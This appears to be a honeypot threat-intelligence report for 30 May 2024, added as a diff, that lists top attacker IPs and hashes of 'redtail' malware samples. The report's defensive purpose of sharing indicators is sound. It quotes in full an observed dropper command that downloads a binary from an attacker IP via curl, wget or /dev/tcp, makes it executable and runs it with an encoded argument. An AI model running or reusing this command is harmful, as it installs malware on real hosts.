@@ -1,0 +1,36 @@
+Top 5 IPs for 2024-05-30 :
+
+125.26.165.219
+14.103.39.179
+117.199.127.171
+219.156.57.249
+24.152.49.140
+
+
+Malware Observed:
+
+File name: redtail.arm7
+2be800f792d9dfea4e5644b3c340f193568126b4771e0c2dcb95e0d047464b41
+https://www.virustotal.com/gui/file/2be800f792d9dfea4e5644b3c340f193568126b4771e0c2dcb95e0d047464b41
+File name: redtail.arm8
+b9566789c853f706dc06e947eb3d19ce7859c3483f6e7e85296b28f4a8e9090d
+https://www.virustotal.com/gui/file/b9566789c853f706dc06e947eb3d19ce7859c3483f6e7e85296b28f4a8e9090d
+File name: redtail.i686
+eb3b0390f06a0c13383c7478f4f1a55520a31b8668141b3b2792c371e7bcba69
+https://www.virustotal.com/gui/file/eb3b0390f06a0c13383c7478f4f1a55520a31b8668141b3b2792c371e7bcba69
+File name: redtail.x86_64
+8c8d832581a492083e8a97a1016a4ce86a3e0f0c20b21d21e6334e47982719bb
+https://www.virustotal.com/gui/file/8c8d832581a492083e8a97a1016a4ce86a3e0f0c20b21d21e6334e47982719bb
+File name: setup.sh
+630295e5239d386f338f08e112049bef866ae81ee9bb45548bf9ad6bd14802c1
+https://www.virustotal.com/gui/file/630295e5239d386f338f08e112049bef866ae81ee9bb45548bf9ad6bd14802c1
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+Commands/exploits observed:
+
+nohup $SHELL -c "curl http://129.144.180.26:60107/mips_linux -o /tmp/UGSpYamWIL; if [ ! -f /tmp/UGSpYamWIL ]; then wget http://129.144.180.26:60107/mips_linux -O /tmp/UGSpYamWIL; fi; if [ ! -f /tmp/UGSpYamWIL ]; then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /mips_linux' >&6 && cat 0<&6 > /tmp/UGSpYamWIL && chmod +x /tmp/UGSpYamWIL && /tmp/UGSpYamWIL af97z/fnslIgKntKRnB9Ukp9Kj1doeTrwWHuEBDxfsDp+7NcNC19TVhzZFBPYyo+RLfk98x35RIU7nvI+eSzWiAsfVJRfGpaT38hOFqw5unYeesKFu141uvnr107IXtMWXZ3SEh6NTlcr+Lr1n7oEh7pf8nq46FSICl8REZ2dUZOfCI0XLHk6cBv6xMK7n/I9+GyRDcvd0pYdXddXHspIFiy4ffIYecVHul/yenjoVg+KGNOXWp2WUxjKjlau+PpyXzoBBDsYcnq7K9YPSJjTlp9fl5MfC89SrDl6NZ87AoW7nbW6O20UDgrfE1fZHVZS2MoPUSw4u7Wd+ceEu9+yOv1tV0gInVSWXZxRk10KDRcseTrzG/rEwrte8r35LleICp7TFJydFlOdDs9XK/k6cBh7hMR8XvB4+OxWz0tbUhfanZbSmMpPlmv4+vCee8VEOdvzO77s147NXxOX2pyWkZ7Kz9asPXoynbxFRDrYcnh5a9YOCF7TFl0c0hNdSkgW7Tk98188RYV5nXO6eSxWi4vflJZd3JGTXopIFiz4uPOf+4QEP9+yun7tlsgKnlSWnV1Ukp9KjpaoeTuz2HtFxLxfszr+7BYPCF7TFl0cEhNfy4gW7Ph98l36woV7H7C7+WwWTc7eU5GdX1cUnwvOES54OPOf+4QFv9+wOv7sF8/NXlIRnZxXUZ7Kz9esfXh1n3uEwrtfcj35LhdNC19TVxwZFlOfTU5W6/m98l75x4S737L7vWwWjg1fE5canVcTmMqOFi74+nJfecEHPF9yuv7sF05NXtFUnJ0WU1/m4g/Lc416d+aCQrw3qLmtoxHEpS1aOAX1XBXvwQY; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/UGSpYamWIL && /tmp/UGSpYamWIL af97z/fnslIgKntKRnB9Ukp9Kj1doeTrwWHuEBDxfsDp+7NcNC19TVhzZFBPYyo+RLfk98x35RIU7nvI+eSzWiAsfVJRfGpaT38hOFqw5unYeesKFu141uvnr107IXtMWXZ3SEh6NTlcr+Lr1n7oEh7pf8nq46FSICl8REZ2dUZOfCI0XLHk6cBv6xMK7n/I9+GyRDcvd0pYdXddXHspIFiy4ffIYecVHul/yenjoVg+KGNOXWp2WUxjKjlau+PpyXzoBBDsYcnq7K9YPSJjTlp9fl5MfC89SrDl6NZ87AoW7nbW6O20UDgrfE1fZHVZS2MoPUSw4u7Wd+ceEu9+yOv1tV0gInVSWXZxRk10KDRcseTrzG/rEwrte8r35LleICp7TFJydFlOdDs9XK/k6cBh7hMR8XvB4+OxWz0tbUhfanZbSmMpPlmv4+vCee8VEOdvzO77s147NXxOX2pyWkZ7Kz9asPXoynbxFRDrYcnh5a9YOCF7TFl0c0hNdSkgW7Tk98188RYV5nXO6eSxWi4vflJZd3JGTXopIFiz4uPOf+4QEP9+yun7tlsgKnlSWnV1Ukp9KjpaoeTuz2HtFxLxfszr+7BYPCF7TFl0cEhNfy4gW7Ph98l36woV7H7C7+WwWTc7eU5GdX1cUnwvOES54OPOf+4QFv9+wOv7sF8/NXlIRnZxXUZ7Kz9esfXh1n3uEwrtfcj35LhdNC19TVxwZFlOfTU5W6/m98l75x4S737L7vWwWjg1fE5canVcTmMqOFi74+nJfecEHPF9yuv7sF05NXtFUnJ0WU1/m4g/Lc416d+aCQrw3qLmtoxHEpS1aOAX1XBXvwQY" 
